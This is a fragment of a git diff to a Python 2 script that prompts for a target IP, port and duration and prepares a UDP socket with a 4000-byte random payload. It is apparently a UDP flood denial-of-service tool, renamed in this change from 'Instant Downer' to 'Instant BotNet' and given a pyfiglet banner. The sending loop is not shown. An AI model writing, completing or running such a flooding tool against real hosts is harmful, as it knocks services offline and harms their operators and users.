@@ -3,13 +3,16 @@ import sys
 import time
 import socket
 import random
+import pyfiglet
+
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
 bytes = random._urandom(4000)
 
 os.system("clear")
-print('\x1b[1;33;40m' + ' /!\ Instant Downer /!\ ' + '\x1b[1m')
+ascii_banner = pyfiglet.figlet_format("Instant BotNet")
+print(ascii_banner)
 ip = raw_input("Ip Adress: ")
 port = input("Port: ")
 times = input("Time: ")
